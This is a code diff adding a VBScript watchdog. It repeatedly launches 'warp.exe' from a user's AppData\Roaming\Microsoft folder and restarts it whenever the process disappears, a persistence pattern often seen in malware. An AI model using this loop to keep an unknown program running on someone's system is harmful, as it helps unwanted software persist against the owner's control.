@@ -1,0 +1,15 @@
+Dim WshShell, objWMIService, colProcess, process
+Set WshShell = CreateObject("WScript.Shell")
+Do
+    WshShell.Run """C:\Users\ADMIN\AppData\Roaming\Microsoft\warp.exe"""
+    WScript.Sleep 5000
+    Set objWMIService = GetObject("winmgmts:\\.\root\CIMV2")
+    Set colProcess = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='warp.exe'")
+    If colProcess.Count = 0 Then
+    Else
+        Do
+            WScript.Sleep(3000)
+            Set colProcess = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='warp.exe'")
+        Loop While colProcess.Count > 0
+    End If
+Loop
